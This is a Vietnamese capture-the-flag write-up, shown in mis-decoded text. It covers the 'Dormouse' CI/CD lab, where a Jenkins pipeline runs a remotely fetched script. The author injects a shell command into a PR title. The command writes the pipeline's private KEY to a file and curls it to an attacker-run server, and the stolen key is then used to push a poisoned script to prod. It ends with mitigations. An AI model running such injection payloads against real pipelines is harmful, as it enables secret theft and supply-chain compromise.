# Dormouse

![Untitled](Dormouse%208d80348bc0d9444e821ff3e68c2b81f0/Untitled.png)

Sau khi kiá»ƒm tra project trÃªn Jenkins ta tháº¥y project Dormouse Ä‘Æ°á»£c cáº¥u hÃ¬nh multiple branch pipeline vÃ  khi sá»­a pipeline, ta tháº¥y nÃ³ váº«n dÃ¹ng pipeline cá»§a branch main.

Táº¡o PR Ä‘á»ƒ kiá»ƒm tra job cÃ³ cháº¡y khÃ´ng, user alice khÃ´ng cÃ³ quyá»n Ä‘á»ƒ tá»± merge vÃ o branch main.

![Untitled](Dormouse%208d80348bc0d9444e821ff3e68c2b81f0/Untitled%201.png)

KhÃ´ng cÃ³ job nÃ o Ä‘Æ°á»£c cháº¡y

![Untitled](Dormouse%208d80348bc0d9444e821ff3e68c2b81f0/Untitled%202.png)

Chá»‰ cÃ³ thá»ƒ thá»±c hiá»‡n build thá»§ cÃ´ng, nÃ³ sáº½ kÃ©o code tá»« branch main vá» Ä‘á»ƒ build, tuy nhiÃªn ta khÃ´ng thá»ƒ sá»­a Ä‘á»•i code trong branch main Ä‘Æ°á»£c do owner Ä‘Ã£ cáº¥u hÃ¬nh chá»‰ cho ngÆ°á»i cÃ³ quyá»n má»›i Ä‘Æ°á»£c merge code.

![Untitled](Dormouse%208d80348bc0d9444e821ff3e68c2b81f0/Untitled%203.png)

Kiá»ƒm tra Jenkinsfile, ta tháº¥y á»Ÿ stage Unit Tests, nÃ³ thá»±c hiá»‡n down file reportcov.sh tá»« [http://prod/reportcov.sh](http://prod/reportcov.sh) Ä‘á»ƒ thá»±c thi. 

![Untitled](Dormouse%208d80348bc0d9444e821ff3e68c2b81f0/Untitled%204.png)

Kiá»ƒm tra file [reportcov.sh](http://reportcov.sh), file Ä‘Æ°á»£c táº£i xuá»‘ng mÃ  khÃ´ng cÃ³ báº¥t cá»© biá»‡n phÃ¡p ngÄƒn cháº·n nÃ o

![Untitled](Dormouse%208d80348bc0d9444e821ff3e68c2b81f0/Untitled%205.png)

Ná»™i dung cá»§a file nÃ y lÃ  upload 1 file report unit test báº±ng html lÃªn Ä‘á»‹a chá»‰ [http://localhost:1111/upload](http://localhost:1111/upload) vá»›i biáº¿n env ${TOKEN}

![Untitled](Dormouse%208d80348bc0d9444e821ff3e68c2b81f0/Untitled%206.png)

![Untitled](Dormouse%208d80348bc0d9444e821ff3e68c2b81f0/Untitled%207.png)

Má»¥c tiÃªu cá»§a ta lÃ  sáº½ tÃ¬m cÃ¡ch thay Ä‘á»•i ná»™i dung cá»§a file reportcov.sh Ä‘á»ƒ RCE

Khi truy cáº­p vÃ o [http://prod](http://prod) thÃ¬ bÃ¡o 403, khÃ´ng cÃ³ quyá»n truy cáº­p

![Untitled](Dormouse%208d80348bc0d9444e821ff3e68c2b81f0/Untitled%208.png)

Sau khi fuzzing path thÃ¬ Ä‘á»u return vá» 403.

![Untitled](Dormouse%208d80348bc0d9444e821ff3e68c2b81f0/Untitled%209.png)

Liá»‡u cÃ³ thá»ƒ tÃ¬m repo cá»§a web nÃ y vÃ  thay Ä‘á»•i ná»™i dung cá»§a file trong source code ?

(Äoáº¡n nÃ y em xem hint vÃ¬ trong repo cá»§a mÃ¬nh chá»‰ hiá»‡n cÃ¡c repo bÃªn dÆ°á»›i, khÃ´ng rÃµ repo cá»§a prod á»Ÿ Ä‘Ã¢u)

![Untitled](Dormouse%208d80348bc0d9444e821ff3e68c2b81f0/Untitled%2010.png)

![Untitled](Dormouse%208d80348bc0d9444e821ff3e68c2b81f0/Untitled%2011.png)

TÃ¬m Ä‘Æ°á»£c source cá»§a reportcov

![Untitled](Dormouse%208d80348bc0d9444e821ff3e68c2b81f0/Untitled%2012.png)

![Untitled](Dormouse%208d80348bc0d9444e821ff3e68c2b81f0/Untitled%2013.png)

Kiá»ƒm tra Jenkinsfile cá»§a reportcov.sh, ta tháº¥y biáº¿n title lÃ  má»™t untrusted data mÃ  ta cÃ³ thá»ƒ kiá»ƒm soÃ¡t Ä‘Æ°á»£c, nÃ³ Ä‘Æ°á»£c dÃ¹ng trong 1 lá»‡nh shell

CÃ´ng thá»©c :

<aside>
ğŸ’¡ Unsafe method + Untrusted data = ğŸ‘¹

</aside>

![Untitled](Dormouse%208d80348bc0d9444e821ff3e68c2b81f0/Untitled%2014.png)

Tiáº¿p tá»¥c check file Jenkinsfile, ta tháº¥y á»Ÿ stage Deploy, nÃ³ sá»­ dá»¥ng biáº¿n KEY, á»Ÿ Ä‘Ã¢y cÃ³ thá»ƒ lÃ  private key dÃ¹ng cho lá»‡nh scp bÃªn dÆ°á»›i.

![Untitled](Dormouse%208d80348bc0d9444e821ff3e68c2b81f0/Untitled%2015.png)

Má»¥c tiÃªu cá»§a ta lÃ  sáº½ láº¥y Ä‘Æ°á»£c biáº¿n KEY vÃ  tá»± cháº¡y lá»‡nh scp cÃ¹ng private key láº¥y Ä‘Æ°á»£c.

Táº¡o 1 python server Ä‘á»ƒ nháº­n key value tá»« reportcov pipeline gá»­i Ä‘áº¿n

Sá»­a title thÃ nh:

<aside>
ğŸ’¡ `echo "${KEY}" > key && curl -v -G -F file=@key http://host.docker.internal:9898`

</aside>

![Untitled](Dormouse%208d80348bc0d9444e821ff3e68c2b81f0/Untitled%2016.png)

Sau khi táº¡o PR, ta nháº­n Ä‘Æ°á»£c log sau trÃªn python server:

![Untitled](Dormouse%208d80348bc0d9444e821ff3e68c2b81f0/Untitled%2017.png)

Kiá»ƒm tra private key:

![Untitled](Dormouse%208d80348bc0d9444e821ff3e68c2b81f0/Untitled%2018.png)

Chá»‰nh sá»­a láº¡i content file Ä‘á»ƒ get flag

![Untitled](Dormouse%208d80348bc0d9444e821ff3e68c2b81f0/Untitled%2019.png)

Push file lÃªn prod sá»­ dá»¥ng ssh vá»›i key vá»«a láº¥y Ä‘Æ°á»£c

![Untitled](Dormouse%208d80348bc0d9444e821ff3e68c2b81f0/Untitled%2020.png)

Build láº¡i repo dormouse Ä‘á»ƒ get flag

![Untitled](Dormouse%208d80348bc0d9444e821ff3e68c2b81f0/Untitled%2021.png)

Decode base64:

![Untitled](Dormouse%208d80348bc0d9444e821ff3e68c2b81f0/Untitled%2022.png)

Submit flag:

![Untitled](Dormouse%208d80348bc0d9444e821ff3e68c2b81f0/Untitled%2023.png)

## **Äiá»ƒm yáº¿u báº£o máº­t:**

- Input khÃ´ng Ä‘Æ°á»£c kiá»ƒm soÃ¡t
    
    <aside>
    ğŸ’¡ Unsafe method + Untrust data = ğŸ˜‚
    
    </aside>
    

## Biá»‡n phÃ¡p kháº¯c phá»¥c:

- Sá»­ dá»¥ng third-party tá»« cÃ¡c bÃªn tin cáº­y
- Kiá»ƒm soÃ¡t cháº·t cháº½ input
    - Sá»­ dá»¥ng github hook validate commit message
        
        ![Untitled](Dormouse%208d80348bc0d9444e821ff3e68c2b81f0/Untitled%2024.png)
        
    - Sá»­ dá»¥ng white list Ä‘á»ƒ block nhá»¯ng hot key